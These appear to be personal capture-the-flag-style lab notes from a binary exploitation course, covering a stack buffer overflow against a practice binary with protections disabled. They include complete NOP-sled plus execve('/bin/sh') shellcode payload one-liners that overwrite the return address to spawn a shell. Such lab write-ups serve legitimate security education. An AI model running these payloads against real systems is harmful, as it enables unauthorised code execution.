# Buffer overflow, code injection.

# checksec --file ./inject
[*] '/root/lab/rpi_mbe/MBE_lectures/lecture/shellcode/inject'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments



1. Overflow EIP
2. Control EIP
3. NOPSLED
4. SHELLCODE

Notes:

DO NOT ret2NOPSLEP on stack:

This pushes broken instructions inside your shellcode.
You can't push when you've got shellcode on your stack! It misalign memory references.

DO ret2NOPSLEP -> SHELLCODE on heap/mapped memory that won't move the stack.


r < <(python -c 'print "\x90" * (140-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x91\xf6\xff\xbf"')



Overflow happens when 0x8048643 (ret) is exectued, stdin) is overflow

==================================================================================
flag

(python -c 'print "\x90" * (140-23) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x60\x70\xfd\xb7"';cat) | ./inject



==================================================================================
